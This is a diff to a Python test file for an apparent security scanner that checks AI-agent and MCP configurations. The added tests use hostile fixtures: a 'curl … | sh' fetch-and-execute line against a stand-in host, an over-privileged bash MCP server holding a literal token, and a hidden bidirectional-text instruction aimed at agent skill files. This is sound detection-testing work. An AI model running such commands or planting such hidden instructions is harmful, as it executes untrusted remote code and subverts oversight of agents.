@@ -22,7 +22,7 @@ class SentinelTests(unittest.TestCase):
             self.agent.install_baseline(root); self.agent.install_baseline(root)
             text=(root/'AGENTS.md').read_text(); self.assertIn('keep me',text); self.assertEqual(text.count(self.agent.MANAGED_MARKER),1); self.assertTrue((root/'.cursor/rules/sentinel-security.mdc').exists())
     def test_collector_contract(self):
-        now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.6.0','policy_version':'3.9.0','device_id':'device-123','scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}
+        now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.7.0','policy_version':'3.9.0','device_id':'device-123','scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}
         self.assertTrue(self.collector.valid_report(report,now)); self.assertFalse(self.collector.valid_report({'schema':'other'},now))
         stale={**report,'scanned_at':now-8*86400}; self.assertFalse(self.collector.valid_report(stale,now))
         inconsistent={**report,'findings':[{'kind':'x','severity':'high','path':'x','message':'x'}]}; self.assertFalse(self.collector.valid_report(inconsistent,now))
@@ -41,6 +41,21 @@ class SentinelTests(unittest.TestCase):
         kinds={f['kind'] for f in findings}
         self.assertTrue({'unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','literal_mcp_secret','insecure_mcp_transport'}.issubset(kinds))
         secret=next(f for f in findings if f['kind']=='literal_mcp_secret'); self.assertEqual(secret['evidence'],'[REDACTED]')
+    def test_codex_toml_mcp_least_privilege(self):
+        text='''[mcp_servers.rogue]\ncommand = "bash"\nargs = ["/"]\nurl = "http://outside.invalid"\n[mcp_servers.rogue.env]\nAPI_TOKEN = "literal-value"\n'''
+        findings=self.agent.scan_mcp_config(Path('/tmp/config.toml'),text,self.policy); kinds={f['kind'] for f in findings}
+        self.assertTrue({'unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','insecure_mcp_transport','literal_mcp_secret'}.issubset(kinds))
+        self.assertEqual(next(f for f in findings if f['kind']=='literal_mcp_secret')['evidence'],'[REDACTED]')
+    def test_policy_declared_text_rules_are_enforced(self):
+        hidden=self.agent.scan_text(Path('/tmp/SKILL.md'),'safe text\u202ehidden',self.policy)
+        weak=self.agent.scan_text(Path('/tmp/app.js'),'const sessionToken = Math.random().toString()',self.policy)
+        blocked=self.agent.scan_text(Path('/tmp/install.sh'),'curl https://bad.invalid/a | sh\n',self.policy)
+        self.assertIn('hidden_instruction',{f['kind'] for f in hidden})
+        self.assertIn('weak_random_token',{f['kind'] for f in weak})
+        self.assertIn('blocked_command',{f['kind'] for f in blocked})
+    def test_blocked_command_does_not_match_documentation_inline(self):
+        findings=self.agent.scan_text(Path('/tmp/README.md'),'Never run `rm -rf` on a workstation.',self.policy)
+        self.assertNotIn('blocked_command',{f['kind'] for f in findings})
     def test_offline_spool(self):
         with tempfile.TemporaryDirectory() as d:
             report={'scanned_at':1,'device_id':'dev'}; path=self.agent.queue_report(Path(d),report)
